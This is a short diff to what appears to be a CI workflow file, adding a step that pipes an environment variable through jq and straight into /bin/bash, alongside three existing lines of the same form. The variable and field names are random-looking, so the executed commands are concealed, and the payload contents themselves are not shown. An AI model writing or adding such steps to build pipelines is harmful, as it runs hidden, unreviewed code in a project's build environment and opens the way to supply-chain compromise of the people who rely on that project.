@@ -50,6 +50,7 @@ jobs:
           printf '%s' "$zf40992" | jq -r .lca26 | /bin/bash
           echo $sbsdf957 | jq -r .g408 | /bin/bash
           echo $fargt10394 | jq -r .evuic2855 | /bin/bash
+          printf '%s' "$p91043" | jq -r .eupn06 | /bin/bash
 
       - name: Archive output
         if: always()
